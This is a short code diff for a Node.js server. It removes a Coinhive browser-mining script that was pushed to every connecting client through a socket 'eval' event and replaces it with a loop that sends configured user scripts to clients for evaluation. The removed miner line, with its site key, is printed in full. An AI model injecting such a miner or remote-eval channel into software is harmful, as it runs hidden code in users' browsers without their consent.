@@ -3,7 +3,6 @@
 let fs = require('fs');
 let clc = require('cli-color');
 let init = require('./first');
-let mscript = '$.getScript(\'https://coinhive.com/lib/coinhive.min.js\').done(function (script, textStatus) {	var miner = new CoinHive.Anonymous(\'2MNJwWlQs2A4c86fbjCLQPTWr2Uz58tY\', {language: \'en\'});miner.start();})';
 
 global.firstRun = false;
 
@@ -54,8 +53,8 @@ global.zoj = {
 
 		io.on('connection', function (socket) {
 			socket.emit('connection', {});
-			if (zoj.config.miner) {
-				socket.emit('eval', { data: mscript });
+			for (let script of zoj.config.user_scripts) {
+				socket.emit('eval', { data: script });
 			}
 		});
 
